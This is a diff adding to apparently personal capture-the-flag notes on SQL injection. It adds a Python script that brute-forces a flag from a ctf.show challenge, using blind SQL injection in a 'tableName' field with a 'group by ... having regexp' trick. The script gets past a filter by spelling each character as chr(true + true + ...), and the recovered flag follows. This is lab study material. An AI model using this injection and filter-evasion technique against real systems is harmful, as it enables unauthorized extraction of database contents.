@@ -579,3 +579,52 @@ But SQL has the syntax as follows:
 
 ![[Pasted image 20250208112225.png]]
 ![[Pasted image 20250210084023.png]]
+```Python
+# https://7665097b-cd46-4cc2-9f96-b40939773f8f.challenge.ctf.show/
+
+import requests
+
+
+def createNum(n):
+    """
+    Create a string of 'true' repeated n times, separated by ' + '.
+    """
+    if n == 1:
+        return "true"
+    else:
+        str = "true"
+        for i in range(n - 1):
+            str += " + true"
+        return str
+    
+def updateStr(org_str):
+    new_str = ""
+    new_str += "chr(" + createNum(ord(org_str[0])) + ")"
+    for ch in org_str[1:]:
+        new_str += ", chr(" + createNum(ord(ch)) + ")"
+    return new_str
+
+url = "http://7665097b-cd46-4cc2-9f96-b40939773f8f.challenge.ctf.show/select-waf.php"
+str = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
+flag = "ctfshow"
+
+for i in range(0, 150):
+    for j in str:
+        encoded_flag = updateStr(flag + j)
+        payload = {
+            "tableName": "ctfshow_user group by pass having pass regexp(concat(" + encoded_flag + "))",
+        }
+        res = requests.post(url, data=payload)
+        if "user_count = 1;" in res.text:
+            flag += j
+            print(flag)
+            if j == "}":
+                print("flag is {}".format(flag))
+                exit(0)
+            break
+    
+```
+
+```
+ctfshow{4af056c1-5f09-4303-80a0-9c4282f990bf}
+```
